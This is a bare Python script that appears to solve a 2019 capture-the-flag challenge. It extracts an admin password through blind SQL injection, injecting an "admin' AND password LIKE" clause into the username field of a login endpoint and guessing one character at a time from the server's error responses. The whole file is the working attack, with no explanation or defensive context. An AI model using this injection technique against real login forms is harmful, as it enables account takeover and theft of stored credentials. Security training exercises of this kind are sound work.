import requests
import string
password = ""
while(1):
	for s in string.printable:
		data = {
			"username": "admin' AND password LIKE '%s%%" % (password+s),
			"answer": " ",
			"debug": 1
		}
		r = requests.post("http://shell1.2019.peactf.com:10078/result.php",data=data)
		if r.text.find("User does not exist") == -1:
			password += s
			print password
			break